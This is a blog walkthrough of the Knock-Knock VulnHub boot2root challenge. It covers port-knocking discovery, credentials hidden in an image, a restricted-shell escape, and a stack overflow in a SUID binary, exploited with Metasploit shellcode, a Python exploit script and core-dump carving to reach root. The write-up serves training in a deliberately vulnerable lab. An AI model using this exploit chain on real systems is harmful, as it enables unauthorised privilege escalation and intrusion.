---
layout: post
title: "Knock-Knock VM walkthrough"
date: 2014-10-16 15:29:15 +1100
comments: true
categories: [boot2root, pentesting, vulnhub, buffer overflow, port knocking] 
---

Just after awesome weekend hacking away at [Ruxcon](http://ruxcon.org.au), [VulnHub](http://vulnhub.com) delivered yet another boot2root VM - wow, that's been busy (and fun) last couple of weeks! Good practice for another big CTF that is coming up for me very soon...

Anyway, without too much of an intro, let's get to it!

<!-- more -->

Recon
-----

So, as always, start up the pwn-able VM, Kali and get to work.

First, use ```netdiscover``` to find out IP address of our victim.

```
root@kali:~# netdiscover -r 172.16.246.129

 Currently scanning: 172.16.246.0/24   |   Screen View: Unique Hosts           
                                                                               
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
 172.16.246.1    00:50:56:c0:00:01    01    060   VMWare, Inc.                 
 172.16.246.133  00:0c:29:5c:26:15    01    060   VMware, Inc.                 
 172.16.246.254  00:50:56:e9:b1:8a    01    060   VMWare, Inc.                 
```

Next, ```nmap``` to see what services do we see (standard procedure, really).

```
root@kali:~# nmap -sV 172.16.246.133

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 15:40 EST
Nmap scan report for 172.16.246.133
Host is up (0.00038s latency).
All 1000 scanned ports on 172.16.246.133 are filtered
MAC Address: 00:0C:29:5C:26:15 (VMware)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
```

What... can't see anything?! But we can ping it right?

```
root@kali:~# ping 172.16.246.133
PING 172.16.246.133 (172.16.246.133) 56(84) bytes of data.
From 172.16.246.133 icmp_seq=1 Destination Port Unreachable
From 172.16.246.133 icmp_seq=2 Destination Port Unreachable
From 172.16.246.133 icmp_seq=3 Destination Port Unreachable
^C
--- 172.16.246.133 ping statistics ---
3 packets transmitted, 0 received, +3 errors, 100% packet loss, time 1999ms
```

Ok, I admit, at this point I thought something went wrong with VM's network adapter, however, as zer0w1re pointed out, there's is a difference between "Host Unreachable" and "Port Unreachable"... ahhhh, of course! I skimmed through the output too quickly - first lesson learnt, carefully read what's displayed back on the screen! Duh!


Port knocking
-------------

Anyway, looks like everything is being blocked by a host firewall and all ports are closed. Also, the name of the VM suggests that we are most likely dealing with a "port knocking" mechanism, which is kind of security by obscurity, implementing an idea of knocking on the door following a specific pattern to make the door open. Since we're dealing with a server here, we'll need to know a proper sequence of ports to knock for the firewall rules to be loosened for our IP address.

Ok, but how do we find the actual port sequence? There's no real way of bypassing port knocking, you really need to know the right sequence. Brute forcing is simply not viable - too many ports and too many possible variations.

Let's have a look at the ```nmap``` output again... we only scanned default, low ports ("All 1000 scanned ports on 172.16.246.133 are filtered"), let's scan beyond that!

```
root@kali:~# nmap -sV -p 0-5000 172.16.246.133

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 15:50 EST
Nmap scan report for 172.16.246.133
Host is up (0.00039s latency).
Not shown: 5000 filtered ports
PORT     STATE SERVICE VERSION
1337/tcp open  waste?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port1337-TCP:V=6.47%I=7%D=10/16%Time=543F4EB8%P=i686-pc-linux-gnu%r(NUL
SF:L,15,"\[6129,\x2023888,\x2012152\]\n");
MAC Address: 00:0C:29:5C:26:15 (VMware)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.08 seconds
```

That's better! We can see port 1337 listening! And it gives an interesting output:

```
root@kali:~# nc 172.16.246.133 1337
[32510, 55533, 4648]
```

Alright, looks like a sequence of ports we need to knock on - let's go ahead and try to knock. We have few options here, we can either use single commands to knock on those ports (```ping```, ```nc```, ```hping3```), write a simple script to do it for us in sequence, or use predefined program that will do it for us, e.g. ```knock``` - a port knocking client, coming as a part of a knockd server.

And that's where it becomes weird. I tried number of different approaches with varying results. Generally what I was doing was:

1. nc 172.16.246.133 1337
2. knock on ports
3. nmap -sV 172.16.246.133

I tried knocking with ```nmap```, ```nc```, ```ping```, wrote a script knocking with ```hping3```, nothing seemed to be working! And then, a simple chained command worked:

```
root@kali:~# hping3 -S 172.16.246.133 -p 680 -c 1; hping3 -S 172.16.246.133 -p 39372 -c 1; hping3 -S 172.16.246.133 -p 46484 -c 1
```

```
root@kali:~# nmap -sV 172.16.246.133

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 16:21 EST
Nmap scan report for 172.16.246.133
Host is up (0.00028s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
80/tcp open  http    nginx 1.2.1
MAC Address: 00:0C:29:5C:26:15 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.21 seconds
```

That got me thinking, why all of a sudden one command worked while all others didn't. Maybe the order of ports provided is not neccessarily left-to-right, but is randomised? I wrote a simple bash script trying all possible combinations to test it out.

{% codeblock lang:bash %}
#!/bin/bash

if [ $# -ne 4 ]; then
	echo "Usage: $0 ip port1 port2 port3"
	exit;
fi

HOST=$1
shift

# Go through all possible combinations of 3 ports
for PORT_1 in "$@"
do
	for PORT_2 in "$@"
	do
			for PORT_3 in "$@"
			do
				hping3 -S $HOST -p $PORT_1 -c 1 >&2 > /dev/null
				hping3 -S $HOST -p $PORT_2 -c 1 >&2 > /dev/null
				hping3 -S $HOST -p $PORT_3 -c 1 >&2 > /dev/null
			done
	done
done
{% endcodeblock %}

Restarted the Knock-Knock VM and tried again.

```
root@kali:~# nc 172.16.246.133 1337
[1138, 1248, 56206]
root@kali:~# ./portknock.sh 172.16.246.133 1138 1248 56206
--- 172.16.246.133 hping statistic ---
1 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

--- 172.16.246.133 hping statistic ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

--- 172.16.246.133 hping statistic ---
1 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

...truncated...

root@kali:~# nmap -sV 172.16.246.133

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-16 19:33 EST
Nmap scan report for 172.16.246.133
Host is up (0.00030s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
80/tcp open  http    nginx 1.2.1
MAC Address: 00:0C:29:5C:26:15 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.19 seconds
```

Woohoo, so that worked! Lesson #2 learnt - don't assume stuff... sometimes it helps, but not always pays off!

Invisible ink and Ceasar(ish) cipher
------------------------------------

Ok, moving on - start up Iceweasel and let's have a look at the site.

![Door](/images/posts/2014-10-16-knock-knock-vm-walkthrough/door.png)

Let's find something we can use to break in. Few things I looked at without any luck:

* robots.txt file doesn't exist
* ```dirbuster``` didn't return anything interesting
* tried to analyse and replay traffic using ```burpsuite```, but also wasn't able to find anything interesting, except some basic cache headers

After poking around for ages, I got pretty frustrated, I couldn't find anything that would give me a way in! But after having a chat with [barrebas](https://twitter.com/barrebas), I realised that "picture is worth a thousand words" and decided to look into it closer.

Initially I thought that I'll need to do some fancy stego on it, but first I downloaded the file, ran ```strings``` on it and found something very interesting at the bottom of the output.

```
root@kali:~# strings knockknock.jpg

...truncated...

tR)O
MO:/?
qW|U
\+\U
Login Credentials
abfnW
sax2Cw9Ow
```

Cool! We have something. Straight away I tried logging via SSH in with username: abfnW and password: sax2Cw90w, but that didn't work. I tried username: sax2Cw90w and password: abfnW, but that didn't work either.

I started thinking what could it be, obviously it must have been somehow encrypted. Doesn't look like base64, neither like MD5. Let's go back to the ancient times and try a Caesar cipher.

Again, thanks to barebass, who pointed me out to this useful resource [Caesarian Shift](http://rumkin.com/tools/cipher/caesar.php) I tried going through various different rotations and trying to find something that would like a human readable string. Nothing stood out straight away, but after few more tries and looking at a particularly popular ROT-13, I realised that the username and password were actually backwards!

```
abfnW   -   Wnfba
nosaJ   -   Jason
```

Wooho, did the same for password and tried logging in SSH with the following credentials:

```
username: Jason
password: jB9jP2knf
```

```
root@kali:~# ssh Jason@172.16.246.133
Jason@172.16.246.133's password: 
Permission denied, please try again.
Jason@172.16.246.133's password: 
```

Oops, "Jason" didn't work, let's try all lower case (more in sync with Unix account naming convention).

```
root@kali:~# ssh jason@172.16.246.133
jason@172.16.246.133's password: 
Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Oct 13 15:21:04 2014 from 172.16.246.129
jason@knockknock:~$ 
```

Restricted shell escape
-----------------------

Ha! We've got a shell! Let's poke around. We'll quickly discover that we're in a limited shell.

```
jason@knockknock:~$ echo $SHELL
/bin/rbash
```

But thanks to Persistence, I've learned couple ways of bypassing that, so straight away, I used the same technique as I did in Persistence.

```
jason@knockknock:~$ ftp
ftp> !/bin/bash
jason@knockknock:~$ echo $SHELL
/bin/rbash
jason@knockknock:~$ export SHELL="/bin/bash"
jason@knockknock:~$ echo $SHELL
/bin/bash
```

Core dump(ster) diving
----------------------

Since now we have a normal shell, we can do regular stuff. First thing that stands out if ```tfc``` binary with SUID bit set! We may be able to get our root through there.

```
jason@knockknock:~$ ls -al
total 32
drwxr-xr-x 2 jason jason 4096 Oct 14 12:25 .
drwxr-xr-x 3 root  root  4096 Sep 24 21:03 ..
lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history -> /dev/null
-rw-r--r-- 1 jason jason  220 Sep 24 21:03 .bash_logout
-rw-r--r-- 1 jason jason 3398 Sep 25 21:58 .bashrc
-rw-r--r-- 1 jason jason  675 Sep 24 21:03 .profile
-rwsr-xr-x 1 root  jason 7457 Oct 11 18:35 tfc
-rw------- 1 jason jason 3204 Oct 14 05:31 .viminfo
```

Let's see what it is.

```
jason@knockknock:~$ strings tfc 
/lib/ld-linux.so.2
lWGI
__gmon_start__
libc.so.6
_IO_stdin_used
strrchr
puts
printf
read
close
open
strcmp
__libc_start_main
write
__xstat
__lxstat
GLIBC_2.0
PTRhp
QVh$
[^_]
	Tiny File Crypter - 1.0
Usage: ./tfc <filein.tfc> <fileout.tfc>
>> Filenames need a .tfc extension
>> No symbolic links!
>> Failed to open input file
>> Failed to create the output file
>> File crypted, goodbye!
;*2$"
_______________________________  
\__    ___/\_   _____/\_   ___ \ 
  |    |    |    __)  /    \  \/ 
  |    |    |     \   \     \____
  |____|    \___  /    \______  /
                \/            \/ 
```

Looks like some type of file encrypter, let's test it out.

```
jason@knockknock:~$ echo "test" > in.tfc
jason@knockknock:~$ ./tfc in.tfc out.tfc
>> File crypted, goodbye!
jason@knockknock:~$ cat out.tfc 
��i�jason@knockknock:~$ 
```

Ok, so it does encrypt the input. Let's see what happens when we provide a huge input, maybe we'll be able to trigger buffer overflow condition.

```
jason@knockknock:~$ python -c 'print "A" * 6000' > in.tfc
jason@knockknock:~$ ./tfc in.tfc out.tfc
Segmentation fault
```

Promising! Let's see what protections are enabled on it.

```
root@kali:~# scp checksec.sh jason@172.16.246.133:.
jason@172.16.246.133's password: 
checksec.sh                                   100%   26KB  26.5KB/s   00:00    
```

```
jason@knockknock:~$ ./checksec.sh --file tfc
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   tfc
```

Wow, everything disabled! That's gonna be one quick and easy exploit... well, at least that's what I thought!

Let's get a copy of binary to our Kali (knock-knock doesn't have gdb on it) and debug it in gdb to see if we can overwrite return address.

```
root@kali:~# python -c 'print "A" * 6000' > in.tfc
root@kali:~# gdb tfc 
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /root/tfc...(no debugging symbols found)...done.
(gdb) run in.tfc out.tfc
Starting program: /root/tfc in.tfc out.tfc

Program received signal SIGSEGV, Segmentation fault.
0x0675c916 in ?? ()
```

Huh? 0x0675c916? Where's my 0x41414141? I think the entire input (even out of bounds) is getting encrypted... oh boy, that's gonna be fun.

I started playing around with inputs and analysing the behaviour of the encryption, when I suddenly came up with an idea to see what will happen if I will pass in encrypted output as an input:

```
root@kali:~# echo "hello" > in.tfc
root@kali:~# ./tfc in.tfc out.tfc 
>> File crypted, goodbye!
root@kali:~# ./tfc out.tfc out2.tfc
>> File crypted, goodbye!
root@kali:~# cat out2.tfc 
hello
```

Sweet, that could be potentially useful! It means that I should be able to encode my payload and then pass it in as an input and it should work! Yeah, not really... I actually won't be able to get my full payload (shellcode etc.) encrypted as I will need to write out of bounds, and the application will crash instead of giving me my output.

From the analysis I did, it was also impossible to just encrypt shellcode and append it to the end of actual payload as the decryption would be different. Ahhh, seems like the only option is to reverse engineer the encryption mechanism and implement my own, with bigger buffer, pass my exploit payload through it, encrypt it, and then passed the encrypted one into the ```tfc``` to exploit it. Seems like a lot of work... and I'm not that strong with super detailed analysis of assembly (at least not yet!). Hmmmmm... what else can I do!

And then it hit me. A lot of useful, debugging information is in the dumped core files! How about if I'll just extract entire encoded input from dumped core, instead of reverse engineering the encryption? Sounds like a plan!

To allow cores being dumped we can just increase maximum size of core files created by running:

```
root@kali:~# ulimit -c unlimited
```

But first, how do I know what exactly to extract? I will need to know offset of where to start and length of the input I need.

With trial and error (basically passing in input of varying lengths and checking address of return address in gdb), I was able to figure out how many bytes to pass in to overwrite the return address (4124 bytes).

Cool, now we need to know where to start.

Analysing encrypted output, I realised that the input with "A"s always starts with the same bytes (as long as there's more than 4 "A"s - but that's the way the encrypting algorithm works - I did a simple analysis of it in IDA).

```
root@kali:~# python -c 'print "A" * 100' > in.tfc
root@kali:~# ./tfc in.tfc out.tfc
>> File crypted, goodbye!
root@kali:~# xxd out.tfc | head
0000000: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H
```

So, as long as there's only one occurence of ```def0 5bab``` in the core, we have all information we need. Let's check the core.

```
root@kali:~# python -c 'print "A" * 6000' > in.tfc
root@kali:~# ./tfc in.tfc out.tfc 
Segmentation fault (core dumped)
root@kali:~# xxd core | grep 'def0 5bab'
0030700: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H
```

Awesome! Now we can craft our exploit and extract its encrypted version from the core.

But we need few more things for our exploit to make it work, address of a ```jmp esp``` instruction to overwrite return address with (to tell the program to jump to the top of the stack) and actual shellcode (we'll use metasploit payload generator).

To get ```jmp esp``` address, we'll use ```msfelfscan```.

```
root@kali:~# msfelfscan -j esp tfc 
[tfc]
0x08048e93 jmp esp
0x08048e93 jmp esp
```

Sweet, the address doesn't have null bytes, so that makes it easier (otherwise it would probably messed up our exploit, as it would be treated as end of string).

Now the shellcode. We'll use metasploit to generate something that would suit our needs.

```
root@kali:~/exploit# msfconsole

IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


Love leveraging credentials? Check out bruteforcing
in Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.10.0-2014100201 [core:4.10.0.pre.2014100201 api:1.0.0]]
+ -- --=[ 1349 exploits - 742 auxiliary - 217 post        ]
+ -- --=[ 340 payloads - 35 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use payload/linux/x86/
use payload/linux/x86/adduser
use payload/linux/x86/chmod
use payload/linux/x86/exec
use payload/linux/x86/meterpreter/bind_ipv6_tcp
use payload/linux/x86/meterpreter/bind_nonx_tcp
use payload/linux/x86/meterpreter/bind_tcp
use payload/linux/x86/meterpreter/find_tag
use payload/linux/x86/meterpreter/reverse_ipv6_tcp
use payload/linux/x86/meterpreter/reverse_nonx_tcp
use payload/linux/x86/meterpreter/reverse_tcp
use payload/linux/x86/metsvc_bind_tcp
use payload/linux/x86/metsvc_reverse_tcp
use payload/linux/x86/read_file
use payload/linux/x86/shell/bind_ipv6_tcp
use payload/linux/x86/shell/bind_nonx_tcp
use payload/linux/x86/shell/bind_tcp
use payload/linux/x86/shell/find_tag
use payload/linux/x86/shell/reverse_ipv6_tcp
use payload/linux/x86/shell/reverse_nonx_tcp
use payload/linux/x86/shell/reverse_tcp
use payload/linux/x86/shell_bind_ipv6_tcp
use payload/linux/x86/shell_bind_tcp
use payload/linux/x86/shell_bind_tcp_random_port
use payload/linux/x86/shell_find_port
use payload/linux/x86/shell_find_tag
use payload/linux/x86/shell_reverse_tcp
use payload/linux/x86/shell_reverse_tcp2
msf > use payload/linux/x86/exec 
msf payload(exec) > show options

Module options (payload/linux/x86/exec):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD                    yes       The command string to execute

msf payload(exec) > set CMD /bin/sh
CMD => /bin/sh
msf payload(exec) > show options

Module options (payload/linux/x86/exec):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD   /bin/sh          yes       The command string to execute

msf payload(exec) > generate -b '\x00'
# linux/x86/exec - 70 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=/bin/sh
buf = 
"\xdb\xd0\xbd\x79\xf6\x5f\x15\xd9\x74\x24\xf4\x58\x33\xc9" +
"\xb1\x0b\x31\x68\x1a\x03\x68\x1a\x83\xc0\x04\xe2\x8c\x9c" +
"\x54\x4d\xf7\x33\x0d\x05\x2a\xd7\x58\x32\x5c\x38\x28\xd5" +
"\x9c\x2e\xe1\x47\xf5\xc0\x74\x64\x57\xf5\x8f\x6b\x57\x05" +
"\xbf\x09\x3e\x6b\x90\xbe\xa8\x73\xb9\x13\xa1\x95\x88\x14"
```

Bunch of shellcodes available for our target system, we'll use one that executes command, and the command will of course be ```/bin/sh``` :)

Also, generating payload with ```-b``` switch allows us to specify characters to blacklist. We don't want any null bytes in our shellcode, so we'll blacklist that.

Ok, now we have all we need. Let's have a look how our final exploit will look like.

{% codeblock lang:python %}
#/usr/bin/python

# Metasploit generated shellcode - 70 bytes
shellcode = "\xdb\xd0\xbd\x79\xf6\x5f\x15\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0b\x31\x68\x1a\x03\x68\x1a\x83\xc0\x04\xe2\x8c\x9c\x54\x4d\xf7\x33\x0d\x05\x2a\xd7\x58\x32\x5c\x38\x28\xd5\x9c\x2e\xe1\x47\xf5\xc0\x74\x64\x57\xf5\x8f\x6b\x57\x05\xbf\x09\x3e\x6b\x90\xbe\xa8\x73\xb9\x13\xa1\x95\x88\x14"

content = "A" * 4124             # fill up the buffer
content += "\x93\x8e\x04\x08"    # overwrite return address with address of 'jmp esp' instruction
content += "\x83\xec\x7f"        # instruction code for 'sub $esp, 175' to make space on the stack for the shellcode (basically rewinding stack)
content += shellcode             # our shellcode (70 bytes)
content += "\x90" * 105          # padding after the shellcode to ensure nothing immediatelly after the shellcode is executed as well and therefore corrupting our shellcode

# Print the exploit (we'll redirect output to file)
print content
{% endcodeblock %}

Alright, let's rock'n'roll, print exploit to file, run it through ```tfc```, extract encrypted exploit from core, pass it in again and it should work!

```
root@kali:~# python exploit.py > exploit.in.tfc
root@kali:~# ./tfc exploit.in.tfc exploit.out.tfc
Segmentation fault (core dumped)
root@kali:~# xxd core | grep 'def0 5bab'
002fe00: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H
```

Use ```dd``` to carve out what we need, byte by byte, skipping first 196096 bytes (002fe00 in hex - as above) and grabbing all 4306 bytes (total length of our exploit):

```
root@kali:~# dd if=core of=exploit.out.tfc skip=196096 count=4306 bs=1
4306+0 records in
4306+0 records out
4306 bytes (4.3 kB) copied, 0.017911 s, 240 kB/s
root@kali:~# ./tfc exploit.out.tfc pwnd.tfc
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

Woohooooo, so it works locally on our Kali! All we have left to do is copy our encrypted payload onto knock-knock and run it there.

```
root@kali:~# scp exploit.out.tfc jason@172.16.246.133:.
jason@172.16.246.133's password: 
exploit.out.tfc                               100% 4306     4.2KB/s   00:00    
```

```
jason@knockknock:~$ ./tfc exploit.out.tfc pwned.tfc
# whoami
root
# cd /root
# ls
crpt.py  server.py  start.sh  the_flag_is_in_here
# cd the_flag_is_in_here
# ls
qQcmDWKM5a6a3wyT.txt
# cat *    
 __                         __              __                         __      ____ 
|  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
|  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
|    <|   |  (  <_> )  \___|    <  /_____/ |    <|   |  (  <_> )  \___|    <   |   |
|__|_ \___|  /\____/ \___  >__|_ \         |__|_ \___|  /\____/ \___  >__|_ \  |___|
     \/    \/            \/     \/              \/    \/            \/     \/       

Hooray you got the flag!

Hope you had as much fun r00ting this as I did making it!

Feel free to hit me up in #vulnhub @ zer0w1re

Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)

root password is "qVx4UJ*zcUdc9#3C$Q", but you should already have a shell, right? ;)
# 
```

Summary
-------

Pretty awesome challenge! Really exercised my brain cells and I'm glad I came up with a simple method of exploiting it without going into reverse engineering of the encryption mechanism.

I have actually started reversing it and got a fair bit into it, but then got this core dump idea and decided to write it up this way.

I saw other guys reverse engineered the encryption mechanism and got it working as well, I'd recommend for you to go and check out what [leonjza](https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/) and [barrebas](http://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door/) did!

Again, awesome challenge - big thanks to [VulnHub](http://vulnhub.com) and zer0w1re!
